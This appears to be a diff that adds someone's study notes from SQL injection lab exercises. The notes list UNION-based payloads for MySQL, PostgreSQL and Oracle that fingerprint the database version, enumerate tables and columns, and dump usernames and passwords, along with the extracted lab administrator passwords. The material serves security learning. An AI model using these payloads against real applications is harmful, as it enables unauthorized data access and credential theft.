@@ -1,0 +1,73 @@
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+
+1. Display all products released and unreleased
+
+administrator
+nwnybwhfxujkqahbig76
+
+
+examining database in SQL injection attacks
+
+Database type	Query
+Microsoft, MySQL	SELECT @@version
+Oracle	SELECT * FROM v$version
+PostgreSQL	SELECT version()
+
+
+2. SQL Injection - Product Category
+
+End Goal -  display the database version
+
+Analysis 
+
+1. Find number of columns
+' order by 3# - internal server error
+
+2. Figure out which colums display text 
+' UNION SELECT 'a', 'a'#
+
+3.  Output the version 
+' UNION SELECT @@version, NULL#
+SELECT @@version
+
+
+LISTING DATA in a non Oracle database
+' UNION SELECT 'abc', 'def'--
+' UNION SELEC table_name FROM information_schema.tables--
+
+Table NAME
+users_ihbqtz
+Usename
+username_bqjakt
+Password
+quuenw
+
+'+UNION+SELECT+username_bqjakt,+password_quuenw+FROM+users_ihbqtz--
+
+administrator
+ym62za0vkxmm13zhyf6v
+
+
+' UNION SELECT * FROM information_schema.tables#
+SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+
+FROM ORACLE Database
+'UNION SELECT 'abc', 'def' FROM dual--
+
+' UNION SELECT table_name, NULL FROM all_tables--
+table_name
+USERS_YBFGUP
+
+'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_YBFGUP'--
+
+USERNAME_UNRAXH
+PASSWORD_FLUBLV
+
+'+UNION+SELECT+USERNAME_UNRAXH,+PASSWORD_FLUBLV+FROM+USERS_YBFGUP--
+
+administrator
+u7k2euzsgees6b5g6d0f
+
+SELECT * FROM all_tables
+SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
